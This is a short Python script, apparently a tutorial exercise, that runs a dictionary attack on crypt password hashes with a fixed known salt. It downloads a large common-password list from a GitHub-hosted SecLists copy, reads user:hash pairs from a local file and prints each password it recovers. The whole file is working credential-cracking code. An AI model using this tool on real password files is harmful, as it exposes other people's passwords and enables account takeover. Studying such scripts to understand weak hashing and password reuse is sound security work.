#!/usr/bin/python3
"""! @Brief script to demonstrate the password cracking provided the salt is already known."""

import crypt
from termcolor import colored
from urllib.request import urlopen

def crackPasswd(passwd, salt):
   passList = str(urlopen('https://raw.githubusercontent.com/rahulkaplesh/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt').read(), 'utf-8')
   for password in passList.split('\n'):
      hashValue = crypt.crypt(password, salt)
      if hashValue == passwd:
         print(colored('[+] Password is : ' + password, 'green'))
         return
      else:
         pass
   print(colored('[-] Password could not be found in the list', 'red'))

def main():
   passfile = open('passwdCracking/passfile.txt', 'r')
   for line in passfile.readlines():
      user = line.split(':')[0]
      passwd = line.split(':')[1].strip('\n')
      print(colored('[*] Trying to decrypt for the user : ' + user, 'yellow'))
      crackPasswd(passwd, 'GH')

if __name__ == '__main__':
   main()